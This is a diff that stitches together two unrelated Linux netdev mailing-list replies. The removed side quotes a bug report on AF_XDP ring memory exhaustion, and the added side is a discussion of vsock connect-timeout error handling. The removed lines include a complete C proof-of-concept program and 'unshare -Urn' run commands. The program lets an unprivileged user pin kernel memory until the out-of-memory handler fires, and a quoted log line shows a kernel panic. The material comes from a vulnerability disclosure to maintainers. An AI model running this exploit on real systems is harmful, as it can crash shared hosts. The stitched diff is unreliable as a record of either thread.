@@ -1,252 +1,118 @@
-Received: from mail-pj2-f9.google.com (mail-pj2-f9.google.com [74.125.227.137])
+Received: from mail-pf1-f176.google.com (mail-pf1-f176.google.com [209.85.210.176])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 29FD34CA289
-	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 16:38:46 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.137
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B49153B05A2
+	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 16:52:01 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.176
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785343130; cv=none; b=HnygwN9YDNgNJ+1fjHZZtPQoeAi3oB4HnLrQeQy8xJ/tPkFsRdh2Rk/TgMUfd2PDX6YvpBYUQZjqN45tz0MCez9rl5E6njhHM6KW7jZPKmhWdlr6jHtUP1kiHX49CocGo1nJbh0NgOc2Kg+rzhS1jZcL7AGk3a9oUWr9sXM0Yvo=
+	t=1785343922; cv=none; b=PomFLYjvMrEkJpbNREHnHuTIDzUCmF0xvyI+d/96zg64gWdzP/3H/2aNFjIdIUjn5SaooHA/2ckLgfJ5Q9+LENER5/TN3NCoVPThUMoyijXBzIdZiNcIPGSIjhmuu+karcoDuyjjrmkz7MMWeQA6OEIuALZoXdbjIxY+HqoUkko=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785343130; c=relaxed/simple;
-	bh=o0NSRCyiPXXgriEdOwt8eGcwXFo+fSB818rHUmF8Oak=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=Z4wl4iDEZm7Td8KxVIUs+R6bfXwvqqmuMmMO9pO4wuHWXDKLs5TbjALZGyfLGSP9aTmK1d60RmbeC1zR2FTio9PCtYxV6QVmNN1Xda7dHpgPbUkOQ/9hC77dm8WxAiU5sWZUmns8+f6BdmYDBhpX2iWD4TcyW4E/XU1jTtULRdU=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qx2ziNkF; arc=none smtp.client-ip=74.125.227.137
+	s=arc-20240116; t=1785343922; c=relaxed/simple;
+	bh=0ZcKYC6CqCOE778Klu3EdkP+RTdCnMbliRZDv81Ibc0=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=izjKz0NrEfvb9qktHvp7O6KT+wnMrPKxQxyhHovb/y8c8LGEzvJIszLEt/7FPSFCbJoZ+hu1UYVo/XpCwWbNS1h1rZfzS2Lj7ciTwa+JJCsGLLXO3m+GNA5FbBLyEJ21uXIQtKMNIJqKQYcTfMrUkS7QGlNsBVKmS3XEfQ5gRqg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=FvLiY0mn; arc=none smtp.client-ip=209.85.210.176
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qx2ziNkF"
-Received: by mail-pj2-f9.google.com with SMTP id 98e67ed59e1d1-38eca9b7114so544488a91.1
-        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 09:38:46 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="FvLiY0mn"
+Received: by mail-pf1-f176.google.com with SMTP id d2e1a72fcca58-84861fc51f5so892872b3a.1
+        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 09:52:01 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1785343124; x=1785947924; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=5qSxttMWa0mJscjM1mfb0RauUUayXTalCzLP7th5DS4=;
-        b=qx2ziNkFgEyhf+BdxRI+f6g4aM9j0FvyAP5t7R1HDY01U3NgcNKLKr/nRi8I3jnOZd
-         Bewj2SBMFlKMT39rqkGy2UWHyROsCF3Da3vFj/pmYNC+3XFtPj54xTiOAVLuw/Gp/Nd/
-         N4XI2Vu0wKay17C43hdxBpNEpxJtFrLe1AfdhReCPHMP7cRawNXBhin3+w9I7N9dbqgW
-         mKWlCBAydJI8wa7YZuXiNDItOmhdgTvmRjGnoaTvk6dCDZR2P5gUvc1pF6trPPOL/OqU
-         IbnyqUte7JznkOrEhJKbrUnjx4aRgzG9TZa/at4GpS3YghMUEHLUeONgw+QpFWvMwIBJ
-         efSQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785343124; x=1785947924;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+        d=gmail.com; s=20251104; t=1785343921; x=1785948721; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:in-reply-to:from
+         :content-language:references:cc:to:subject:user-agent:mime-version
+         :date:message-id:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=5qSxttMWa0mJscjM1mfb0RauUUayXTalCzLP7th5DS4=;
-        b=S5HJnJBM/F9XM0CzpOLBquRWvvonWQTzT4SPc71x7Kf6h0Ywf70MQVZoQt2dCcfCz7
-         1higz1OHFxdjYS3cmqyaFswER7sAHAXZCq2R6cweo4QGc2stddkS5SNWQf4D1qBhc4g+
-         suvXFv18UzdNotgk8Az04e08WuPeb4CnuEimHw6UcuOKW+rAaoeQQuhQEh/b25Vgtf27
-         wlbKquQpVjlemso0/Dr30KkWY0fhHG9moOhv52ihPH8eFupsoFpShdZIw8SnnoCr0DM3
-         ISyNXfkWQ4pLOuP9d83Kyhib3UPWuBMDIpNj3gcTruzoeLQDoAEVxZh9R++kADJ2j/UG
-         1FqA==
-X-Gm-Message-State: AOJu0YzbcNGRUAG7giwTGGg6nbkLMaO5tNwrw0UC2NgQdf4cCeYwXnR3
-	qXk2zbdJql/JfwX29k2q2fhNMJNZAfKf+qoMo0SmOamAH26dFHFqnrYH
-X-Gm-Gg: AR+sD137e2ccUgYyLPtp9DobJPKe+AQKEpH4a800IDqEI9sgumBqXqpBLem7rTbCgcz
-	Kn68Kai4SpRUkNqOGPUMXjvbzpZ+qVL3cYpxNed7VPbf0u4srV1tCF+O5NtXFGeLIEmjyA/qh1M
-	6xLtLQdh6YuvqtPZGXcYrb1edqxo82aEQkhBPk32X9aer0tvBRlS7qGJmvWhfQlnh0tBt55kPdN
-	nf0rFGdIoR8vX+uhsDjkUcyAS1dOA9gBuGP2WSbku/A/0YvNdWmf08lsbWqJFAT8NmLR+jSPfJ+
-	DPGkJPV3mcG7EybvXLBWLoa+BYc/cmwUKnY4T0yVeoNHj2kvVmJSbqx32cofpUJjoAH5763j3T3
-	Wp0pOKB0+Yc5+7HBnD3o6bpnoKT+YBrhwYCnJn6JqBzzGFVHI5b7rqAEw6HIhjsKqH2BM+RgzYc
-	HA3OWTwXEALBSOOT62vYyjPeTkFVAnoDguWgxpOqM21Zc+q1z0YNnydvYfK8vHSsIFtw==
-X-Received: by 2002:a17:90b:1645:b0:387:e0bb:57f8 with SMTP id 98e67ed59e1d1-38f6a4d6731mr7361780a91.41.1785343124501;
-        Wed, 29 Jul 2026 09:38:44 -0700 (PDT)
-Received: from localhost ([2a03:2880:9ff:72::])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31504cc9dffsm12785644eec.14.2026.07.29.09.38.43
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 29 Jul 2026 09:38:43 -0700 (PDT)
-Date: Wed, 29 Jul 2026 09:37:54 -0700
-From: Stanislav Fomichev <sdf.kernel@gmail.com>
-To: Zihan Xi <zihanx@nebusec.ai>
-Cc: netdev@vger.kernel.org, bpf@vger.kernel.org, magnus.karlsson@intel.com,
-	maciej.fijalkowski@intel.com, sdf@fomichev.me, davem@davemloft.net,
-	edumazet@google.com, pabeni@redhat.com, horms@kernel.org,
-	ast@kernel.org, daniel@iogearbox.net, hawk@kernel.org,
-	john.fastabend@gmail.com, vega@nebusec.ai
-Subject: Re: [PATCH net 0/1] xsk: prevent AF_XDP ring resource exhaustion
-Message-ID: <amosYv8kWGJmmOHV@devvm16445.scu0.facebook.com>
-References: <cover.1785313094.git.zihanx@nebusec.ai>
+        bh=ynliW8RV51DVn6/Hi9bIDwJycFbIH0QxQmXIx2aXoNg=;
+        b=FvLiY0mnd3rhri34fK4F8q8lUhjLUjswYm4I7+fdRsFtCVGjWDnyCH1hL494EltLSd
+         1Si8cn4tEA5jMs+MVXgsYaPeOBQQlKqe+lcrpTRBDQjng+yrPAyb2Z2WkptmwD417he/
+         910iuLVp2zBed+g0F0NPP0x1/51zqRkhqSARKNDhP7MDe8XKg41CBm3fRhVQFt79vwzP
+         VGf8b6+KyxLJteym+ZXaElqkqtw2CBuYTORt3xfr46Qx0QOR5elQF8jjEywRdQ/2UhAf
+         ckvRAuAH5h4OGppM9onIJD+jwD11pBIrBVNxjsMJdmUyl1YzYlVYndxFNbQ79hMNmbT6
+         F4MA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785343921; x=1785948721;
+        h=content-transfer-encoding:content-type:in-reply-to:from
+         :content-language:references:cc:to:subject:user-agent:mime-version
+         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=ynliW8RV51DVn6/Hi9bIDwJycFbIH0QxQmXIx2aXoNg=;
+        b=rRb7l/V6MOZS0N5I5hV6BWKSniOAq5N07YThToyXxKSwqQ+Z9hglLzNPUH1XYJS8mz
+         +TidGWzqlplu643kuvOyPjFS8U1N8x11BtGj/o9Fi7ECsoxbwUtLOtOxlCn87evkwky/
+         ipU4r6ruu5vRDHEK9K0Z8T1R5eATBNtGRd4zzpLq6/w7K7oozP0dkFIg0EK68a7C4G8+
+         DPeF+swUp86BJ546euf7rcFpGjZLyfOZJdXXYHM+qJAFvTlmRuK3GZCcsndsdz0gwHye
+         pU5FdLGHMuDlRvR1Bzjq5uNIVGOcuHE5coQO8boXGpKym9mQUl9Xw7fIKBIfjI0CII4n
+         fWEg==
+X-Forwarded-Encrypted: i=1; AHgh+Rom7ixvteXoIcz0nNlyP3jh5mPmPdWix0HnI55Lqqwy26YnZm854LF4S3tys2G6Qz42y/EZYfk=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yy6nymARkqwUtnkBmzY5dHay74GlNfAIm8PuNL0kG5lBqk4VD+W
+	cKG1DZ6IVkX1XOVJf82UWjqN82miPyN++5e1vZhQwwTJrZlP/Bj27yqscrNy1sl/
+X-Gm-Gg: AR+sD13xl7ur1BjHRj5BPTwusVcFtgbxW9kmMolggBciTjnz4xSxPcQfOEoPgC6g8Vs
+	neVbYNtOtRC4jrMl6XaEJKIUPtC43RNKKwF/9jsLAPjNfSqhEakP0wCuD/gnnGFaR3GaP7UqaN+
+	1DHIidRchQNdm3DBhF5dPi2el0F86h3Zkac4RxldHS57Mssp7+60U5f4TLItUQJrlx+BzkFclZg
+	2dLASlkDlRrcRwMP708DQeNHQcGQ4tQD1GOCDqEj64c3YawI1UX0/JD2m1d5A84UDOQxUQoCVf9
+	TfjO+kcHmdzqdI8dRu6Mmxtq5Gq56waerJkb3pUiQnjzz7l9jJS8wwRKCgrG603HqxSf3LJ1uAc
+	Uw5eJtN145MxPP67CLQmWcQgo8+eO8zMi3Sut6WpYJY5S7tPAdJOZtdPe94LbfpIh5Bnlu+oUK7
+	UO2Y+TSeD9PIIFzsENsPX1xQ7vLm2fMjoqbtUJlwVPbtGtTn+j5Aiud4VlP11QZ3Z6sPA7tqUTM
+	qT4JuwzO1zMWGFv/c7JtRh0RfG1IazmH7eReYqz
+X-Received: by 2002:a05:6a00:a86:b0:848:31fb:43d9 with SMTP id d2e1a72fcca58-84e9332e820mr7983253b3a.45.1785343920946;
+        Wed, 29 Jul 2026 09:52:00 -0700 (PDT)
+Received: from ?IPV6:2406:3003:2007:2131:923:11ce:1cdb:19d4? ([2406:3003:2007:2131:923:11ce:1cdb:19d4])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e9fe1d07dsm1697570b3a.8.2026.07.29.09.51.57
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Wed, 29 Jul 2026 09:52:00 -0700 (PDT)
+Message-ID: <148e56ec-dc26-4be2-a7af-eb547b517a68@gmail.com>
+Date: Thu, 30 Jul 2026 00:51:55 +0800
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-In-Reply-To: <cover.1785313094.git.zihanx@nebusec.ai>
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH] vsock: use sock_error() to consume sk_err after connect
+ timeout
+To: Michal Luczaj <mhal@rbox.co>, Stefano Garzarella <sgarzare@redhat.com>
+Cc: "David S. Miller" <davem@davemloft.net>,
+ Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>,
+ Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>,
+ syzbot+1b2c9c4a0f8708082678@syzkaller.appspotmail.com,
+ virtualization@lists.linux.dev, netdev@vger.kernel.org,
+ linux-kernel@vger.kernel.org
+References: <b81bfea4-6b19-4cc8-95c0-dcd4ad42476e@gmail.com>
+ <95cd0d4e-58c9-44ab-b94f-fcf57b88583b@rbox.co>
+ <amHN9mOGj7oMak4-@sgarzare-redhat>
+ <27412e44-ab4b-4dd3-9685-481875683860@gmail.com>
+ <a6cb1b8f-d8cf-412a-a204-3a26e4db0bd0@rbox.co>
+ <6b684c2f-1f98-43ea-84c9-9b6f162d5e9f@gmail.com>
+ <amhmjLa9DjNFKgmb@sgarzare-redhat>
+ <a4c89c00-ddbe-4278-b386-b83d2b859a70@gmail.com>
+ <amn5vWcyY0f5ErEM@sgarzare-redhat>
+ <e7ff506a-850d-4d7c-8346-c6fef9ad8553@rbox.co>
+ <amoACichDryCaVsG@sgarzare-redhat>
+ <bf3a61f0-cd82-4796-a3ce-d6de8c8dd7ae@rbox.co>
+Content-Language: en-US
+From: Phi Nguyen <phind.uet@gmail.com>
+In-Reply-To: <bf3a61f0-cd82-4796-a3ce-d6de8c8dd7ae@rbox.co>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
 
-On 07/29, Zihan Xi wrote:
-> Hi Linux kernel maintainers,
+On 7/29/2026 11:49 PM, Michal Luczaj wrote:
+> On 7/29/26 15:29, Stefano Garzarella wrote:
+>>
+>> This is a good point!
+>>
+>> So we still need to remove `sk_err` check in vsock_accept(), or set
+>> `sk->sk_err = 0` in vsock_listen() to have a complete fix, right?
 > 
-> We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
-> non-root user via user and net namespace.
-> We've tested it, and it should not affect any other functionality.
+> Yup, that's my understanding as well.
 > 
-> We will provide detailed information about the bug
-> in this email, along with a PoC to trigger it.
-> 
-> ---- details below ----
-> 
-> Bug details:
-> 
-> AF_XDP sockets allow user space to allocate RX, TX, UMEM fill and UMEM
-> completion rings with setsockopt().  xskq_create() only validates that the
-> entry count is non-zero and a power of two before computing the ring size and
-> calling vmalloc_user().  The allocation is not charged against the socket
-> optmem limit.  The underlying root cause dates back to the original shared
-> xskq_create() helper used for UMEM fill rings, while later RX-ring support and
-> the vmalloc-based ring allocation path only made the same bug easier to reach
-> and more effective at pinning memory before bind or packet I/O.
-> 
-> The fix charges the page-aligned ring size to sk_omem_alloc before the
-> vmalloc_user() call and bounds the charge by the namespace optmem limit.  The
-> charge path uses an atomic cmpxchg loop, rather than adding first and rolling
-> back later, so concurrent allocations cannot race past the limit and the
-> signed sk_omem_alloc counter cannot overflow and wrap below the limit.
-> 
-> UMEM fill and completion queues can move from the socket to the AF_XDP buffer
-> pool and be destroyed after socket release.  The queue therefore keeps a
-> socket reference for safe uncharging.  To avoid a release cycle where the
-> queue reference prevents the socket destructor that used to release the pool,
-> the socket now drops its pool and UMEM references from xsk_release() before
-> the final socket put; xsk_destruct() keeps the same helper as a fallback.
-> 
-> This reproducer does not use packetdrill because the trigger is the AF_XDP
-> setsockopt() ring allocation path, not a packet sequence or protocol state
-> transition that packetdrill can express.
-> 
-> Reproducer:
-> 
->     gcc -O2 -static -o poc poc.c
->     unshare -Urn ./poc
-> 
-> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-> 
-> ------BEGIN poc.c------
-> #define _GNU_SOURCE
-> #include <errno.h>
-> #include <linux/if_xdp.h>
-> #include <netinet/in.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/resource.h>
-> #include <sys/socket.h>
-> #include <sys/sysinfo.h>
-> #include <unistd.h>
-> 
-> static void print_meminfo(const char *tag)
-> {
-> 	struct sysinfo info;
-> 
-> 	if (sysinfo(&info) == 0) {
-> 		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
-> 		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
-> 		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;
-> 
-> 		fprintf(stderr,
-> 			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
-> 			tag, total >> 20, free >> 20, avail >> 20);
-> 	}
-> }
-> 
-> static int set_ring(int fd, int optname, unsigned int entries, const char *name)
-> {
-> 	int ret;
-> 
-> 	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
-> 	if (ret) {
-> 		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
-> 			name, entries, strerror(errno));
-> 		return -1;
-> 	}
-> 
-> 	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
-> 		name, entries, fd);
-> 	return 0;
-> }
-> 
-> int main(int argc, char **argv)
-> {
-> 	static const struct {
-> 		int optname;
-> 		const char *name;
-> 	} rings[] = {
-> 		{ XDP_RX_RING, "XDP_RX_RING" },
-> 		{ XDP_TX_RING, "XDP_TX_RING" },
-> 		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
-> 		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
-> 	};
-> 	unsigned int entries = 1U << 25;
-> 	int nsockets = 8;
-> 	int *fds;
-> 	int i, j;
-> 
-> 	if (argc > 1)
-> 		entries = strtoul(argv[1], NULL, 0);
-> 	if (argc > 2)
-> 		nsockets = atoi(argv[2]);
-> 	if (!entries || !nsockets) {
-> 		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
-> 			argv[0]);
-> 		return 1;
-> 	}
-> 
-> 	fds = calloc(nsockets, sizeof(*fds));
-> 	if (!fds) {
-> 		perror("calloc");
-> 		return 1;
-> 	}
-> 
-> 	fprintf(stderr,
-> 		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
-> 		entries, nsockets, getpid());
-> 	print_meminfo("before");
-> 
-> 	for (i = 0; i < nsockets; i++) {
-> 		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
-> 		if (fds[i] < 0) {
-> 			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
-> 				i, strerror(errno));
-> 			break;
-> 		}
-> 
-> 		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
-> 		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
-> 			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
-> 				goto out;
-> 			print_meminfo(rings[j].name);
-> 		}
-> 	}
-> 
-> out:
-> 	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
-> 	sleep(600);
-> 
-> 	for (i = 0; i < nsockets; i++) {
-> 		if (fds[i] >= 0)
-> 			close(fds[i]);
-> 	}
-> 	free(fds);
-> 	return 0;
-> }
-> ------END poc.c--------
-> 
-> ----BEGIN crash log----
+> That said, I'm not against flushing sk_err on a failed blocking connect()
+> (this patch) as a follow up, if you guys agree that makes vsock behave like
+> other socket families.
 
-[..]
+IMO, we should remove the sk_err check in vsock_accept() and invoke 
+sock_error() in vsock_connnect()
 
-> [  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
-
-Isn't it all working as intended? The userspace requests too much, we hit oom.
-Since you seem to have "system-wide panic_on_oom is enabled" your kernel
-panics.
-
-I also looked at the fix and a bit confused about why you picked sysctl_optmem_max
-as a limit. I believe there are better mechanisms (memcg) to limit these
-types of allocations? (and they work by default, no need for any code
-changes)
+Thanks,
+Phi
